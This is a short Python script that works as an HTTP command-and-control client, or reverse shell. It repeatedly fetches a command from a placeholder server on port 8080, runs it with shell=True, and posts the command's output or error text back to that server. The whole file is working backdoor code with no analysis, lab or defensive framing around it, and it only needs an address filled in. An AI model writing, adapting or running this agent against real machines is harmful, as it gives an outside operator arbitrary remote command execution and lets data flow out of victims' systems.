import requests
import subprocess
import time

SERVER = "Your Server is here"
PORT = 8080
URL = "http://{}:{}".format(SERVER, PORT)


def main():
    while True:
        req = requests.get(URL)
        command = req.text
        if 'terminate' in command:
            break
        else:
            result = subprocess.Popen(command, shell=True,
                                      stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
            if len(result.stderr.read()) == 0:
                post_response = requests.post(url=URL,
                                              data=result.stdout.read())
            else:
                post_response = requests.post(url=URL,
                                              data=result.stderr.read())
        time.sleep(2)


if __name__ == '__main__':
    main()
